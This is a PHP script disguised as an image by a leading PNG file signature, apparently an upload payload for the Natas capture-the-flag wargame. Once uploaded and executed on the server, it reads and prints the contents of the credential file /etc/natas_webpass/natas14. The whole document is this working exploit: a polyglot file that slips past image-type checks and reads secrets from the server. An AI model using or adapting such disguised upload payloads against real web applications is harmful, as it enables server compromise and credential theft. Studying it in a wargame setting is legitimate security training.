‰PNG

<?php
$myfile = fopen("/etc/natas_webpass/natas14", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/etc/natas_webpass/natas14"));
fclose($myfile);
?>
